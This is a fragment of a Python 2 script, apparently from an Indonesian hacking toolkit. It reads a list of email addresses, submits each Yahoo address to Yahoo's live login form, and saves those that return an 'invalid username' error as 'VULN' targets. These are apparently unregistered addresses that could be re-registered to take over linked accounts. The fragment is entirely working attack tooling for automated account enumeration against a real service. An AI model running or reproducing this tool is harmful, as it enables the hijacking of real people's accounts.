		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	files = raw_input("\033[1;96m[+] \033[1;93mEnter the file name \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mFile not found"
		raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
		menu()
	mpsh = []
	jml = 0
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;96m="
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail)
				berhasil.append(mail)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
       
		
if __name__ == '__main__':
	login()
